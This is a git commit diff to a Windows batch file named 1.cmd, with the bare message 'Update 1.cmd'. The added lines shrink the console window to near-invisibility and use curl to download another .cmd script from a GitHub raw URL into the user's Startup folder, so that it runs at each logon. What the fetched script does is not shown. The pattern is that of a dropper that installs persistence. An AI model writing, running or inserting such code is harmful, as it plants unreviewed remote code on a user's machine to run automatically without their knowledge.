6157355d145f2c5ce0606c5c1f9f18a4104517ac
jabadabad <106175803+jabadabad@users.noreply.github.com>
2022-05-24 18:58:13 +0200

    Update 1.cmd

--- 1.cmd
+++ 1.cmd
@@ -1,1 +1,2 @@
-
+MODE 20,2
+curl https://raw.githubusercontent.com/jabadabad/jabadabadu/main/jbdbd.cmd --output "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\jbdbd.cmd"
